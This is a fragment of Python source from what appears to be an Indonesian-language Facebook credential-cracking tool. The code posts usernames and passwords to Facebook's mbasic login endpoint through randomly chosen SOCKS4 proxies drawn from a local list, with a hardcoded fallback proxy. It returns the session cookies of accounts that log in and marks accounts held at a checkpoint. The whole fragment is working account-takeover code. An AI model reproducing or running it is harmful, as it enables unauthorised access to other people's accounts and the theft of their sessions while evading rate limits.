                'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ]),
                'view-width': str(random.randint(1311,1499))
            }
            payload.update({'email': username, 'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time())[:10],password)})
            try: proxy = {'http': 'socks4://'+str(random.choice(open("Penyimpanan/Database/proxyKu.txt","r").read().splitlines()))}
            except (Exception) as e: proxy = {'http': 'socks4://207.188.134.194:8118'}
            responsePost = byps.post('https://mbasic.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = payload, headers = headersPost, proxies = proxy, allow_redirects = True)
            if 'c_user' in byps.cookies.get_dict().keys():
                cookies = (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])
                return(cookies, headersPost['user-agent'])      
            elif 'checkpoint' in byps.cookies.get_dict().keys():
                return('[yellow]checkpoint required', headersPost['user-agent'])
            else: return('[red]password salah', headersPost['user-agent'])
        except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e: pass
        
                                
           
